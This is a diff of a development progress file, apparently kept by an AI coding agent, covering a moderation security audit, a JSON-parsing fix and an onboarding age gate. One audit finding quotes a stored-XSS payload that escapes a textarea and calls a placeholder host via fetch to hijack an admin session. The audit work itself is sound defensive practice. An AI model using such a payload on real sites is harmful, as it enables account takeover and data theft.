@@ -10,7 +10,60 @@ doesn't keep reminding about closed work.
 
 ---
 
-## In progress on `claude/priv-fixes-batch-2`
+## In progress on `claude/audit-11-moderation`
+
+- **11차 오딧 — Content moderation + UGC safety (2026-05-26)**:
+  Background audit found **15 findings**. Headline: stored XSS in
+  admin comments queue (DB-level compromise risk) + zero report→
+  review→action pipeline + no rate-limiting on comments + reserved-
+  name impersonation possible.
+  - **MOD-F1 (P0) — LANDED THIS PR**: stored XSS in
+    `korehan-x9f4k2m7.html:8291` admin comments queue. Was
+    interpolating user-controlled `user_name` / `content` / `reply`
+    raw into innerHTML AND into a `<textarea>` body. A commenter
+    posting `</textarea><script>fetch(evil)</script>` would own
+    the admin session on next 💬 Comment Management open — admin
+    context = service-role = full DB compromise. Routed every
+    interpolation through `esc()`. Added `white-space:pre-wrap`
+    for newline preservation.
+  - **MOD-F2 (P0) — STILL OPEN**: no report/flag pipeline (only
+    localStorage). Needs `content_reports` table + RPC + admin
+    queue view. Separate PR.
+  - **MOD-F3 (P0)**: no display-name validation (impersonation +
+    profanity). Needs server-side trigger.
+  - **MOD-F4 (P0)**: avatar upload no server-side MIME/size/EXIF
+    defense. Needs bucket migration + EXIF strip.
+  - **MOD-F5 (P0)**: no server-side comment rate-limit. Needs
+    SECURITY DEFINER RPC.
+  - **MOD-F6–F15** — P1/P2 items in TODO (blocked-user visibility,
+    soft-delete, reporter-images bucket, RTL injection, etc.).
+
+- **Article-gen JSON-parse bug (user-reported, 2026-05-26) —
+  LANDED THIS PR**: Owner sent a screenshot showing "Generate
+  Adapted Articles" failing with "Unexpected non-whitespace
+  character after JSON at position 1398 line 13 col 1". Root
+  cause: the cleanup at `korehan-x9f4k2m7.html:5443-5444` only
+  stripped markdown fences then `JSON.parse`'d directly — broke
+  when Sonnet appended explanatory prose after the closing brace.
+  Replaced with the daily-content-gen pattern: find first `{`,
+  slice to last `}`, parse → repair-trailing-commas → parse.
+
+- **PRIV-F9 (P1) — LANDED THIS PR**: age gate on onboarding.
+  Single "I confirm I am 14+ (16+ EU)" checkbox above the finish
+  button. Blocks `finishOnboarding()` if unchecked. Stamps
+  `localStorage.kh_age_confirmed_at` for audit. KISA-recommended
+  PIPA-22-2 / GDPR-Art-8 lightweight pattern.
+
+---
+
+## On `claude/audit-11-moderation` (PR #621 merged — PRIV-F7)
+
+- (PRIV-F7 client_errors PII scrub landed via PR #621; details
+  retained earlier in this file.)
+
+---
+
+## On `claude/priv-fixes-batch-2` (PR #620 merged 2026-05-26)
 
 - **10차 GDPR/PIPA batch 2 (2026-05-26)** — second round closing
   the remaining big-ticket items from audit 10:
